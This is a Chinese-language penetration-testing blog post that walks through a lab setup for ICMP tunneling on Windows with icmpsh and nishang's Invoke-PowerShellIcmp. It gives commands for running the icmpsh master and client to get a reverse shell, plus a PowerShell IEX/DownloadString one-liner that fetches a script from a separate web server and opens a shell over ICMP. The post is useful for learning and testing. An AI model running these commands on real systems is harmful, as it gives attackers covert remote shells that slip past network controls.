---
layout:     post
title:      Windows网络层ICMP隧道技术
subtitle:   Windows网络层ICMP隧道技术
date:       2021-02-11
author:     木已成舟
header-img: img/post-bg-rwd.jpg
catalog: 	 true
tags:
    - 内网渗透
---

ICMP隧道是一个实用的协议，两个计算机之间进行通信不需要开放额外的端口。

常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、PowerShellIcmp等工具。本篇先来说说Windows上常用的ICMP隧道工具icmpsh和Powershell版本的icmp。

## 0x00 网络环境

搭建一个简单的环境：

- Kali（攻击机）：192.168.0.11
- Win（靶机）：192.168.0.12
- Web服务器：192.168.0.7

## 0x01 icmpsh

icmpsh是C/S架构，slave客户端只能在Windows上允许，它不需要管理员权限即可运行，master管理端是跨平台的。

使用方法：

1. 下载项目：https://github.com/inquisb/icmpsh

2. 使用命令关闭linux内核自带的ICMP应答：`sysctl -w net.ipv4.icmp_echo_ignore_all=1`

   ![20210211162721](../../../../img/20210211162721.png)

3. 使用命令安装`Impacket`类库：`sudo pip install Impacket`

4. 在攻击机Kali上运行管理端：`python icmpsh_m.py  <服务端IP> <客户端IP>`

5. 在客户端Win上运行`icmpsh.exe -t <服务端IP> -d 500 -b 30 -s 128`，攻击机Kali的终端上立马返回了Shell。

   ![20210211164245](../../../../img/20210211164245.png)

   ![20210211164139](../../../../img/20210211164139.png)

6. 使用`tcpdump`命令查看流量确实走了ICMP，`tcpdump -i eth0 icmp`

   ![20210211164400](../../../../img/20210211164400.png)



## 0x02 PowerShellIcmp

PowerShellIcmp是一个nishang的脚本之一。下载地址如下：https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1

使用方法：

1. 管理端依旧使用icmpsh，`python icmpsh_m.py  <服务端IP> <客户端IP>`
2. 客户端远程加载`PowerShellIcmp.ps1`，就能反弹shell：`powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.7:82/icmpshell.txt');Invoke-PowerShellIcmp  -IPAddress 192.168.0.11;"`

![20210211170514](../../../../img/20210211170514.png)

